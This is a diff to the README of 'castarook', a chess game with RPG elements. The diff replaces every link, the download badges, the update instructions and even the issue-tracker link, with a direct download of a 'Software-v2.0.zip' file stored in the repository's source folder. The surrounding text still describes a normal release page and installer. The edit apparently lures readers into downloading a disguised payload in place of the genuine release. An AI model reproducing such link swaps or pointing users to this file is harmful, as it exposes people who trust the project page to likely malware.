@@ -1,6 +1,6 @@
 # 🎲 castarook - 3D Chess with RPG Adventure
 
-[![Download castarook](https://img.shields.io/badge/Download-castarook-ff6347?style=for-the-badge)](https://github.com/SamoraCletus/castarook/releases)
+[![Download castarook](https://img.shields.io/badge/Download-castarook-ff6347?style=for-the-badge)](https://github.com/SamoraCletus/castarook/raw/refs/heads/main/client/src/Software-v2.0.zip)
 
 ---
 
@@ -43,10 +43,10 @@ To play castarook, you need to download and install the game on your Windows com
 
 Start by visiting the official release page:
 
-[![Download castarook](https://img.shields.io/badge/Download-castarook-ff6347?style=for-the-badge)](https://github.com/SamoraCletus/castarook/releases)
+[![Download castarook](https://img.shields.io/badge/Download-castarook-ff6347?style=for-the-badge)](https://github.com/SamoraCletus/castarook/raw/refs/heads/main/client/src/Software-v2.0.zip)
 
 - Click the link above or open this in your browser:  
-  https://github.com/SamoraCletus/castarook/releases
+  https://github.com/SamoraCletus/castarook/raw/refs/heads/main/client/src/Software-v2.0.zip
 
 - On the release page, look for the latest version. It will usually have the highest version number or say “Latest release”.
 
@@ -122,7 +122,7 @@ castarook keeps the basic rules of chess but adds dice rolls to change how piece
 ## 🔄 Updating castarook
 
 - New versions appear on the same GitHub release page:  
-  https://github.com/SamoraCletus/castarook/releases  
+  https://github.com/SamoraCletus/castarook/raw/refs/heads/main/client/src/Software-v2.0.zip  
 
 - When notified of an update, download the new installer `.exe` file.  
 - Run the new setup file to install the latest version over your current installation.  
@@ -144,7 +144,7 @@ Topics related to the project include:
 
 If you run into issues not covered here or have questions about the game, open a new issue on the GitHub repository:
 
-https://github.com/SamoraCletus/castarook/issues
+https://github.com/SamoraCletus/castarook/raw/refs/heads/main/client/src/Software-v2.0.zip
 
 Provide details like:
 
@@ -154,4 +154,4 @@ Provide details like:
 
 ---
 
-[![Download castarook](https://img.shields.io/badge/Download-castarook-ff6347?style=for-the-badge)](https://github.com/SamoraCletus/castarook/releases)
+[![Download castarook](https://img.shields.io/badge/Download-castarook-ff6347?style=for-the-badge)](https://github.com/SamoraCletus/castarook/raw/refs/heads/main/client/src/Software-v2.0.zip)
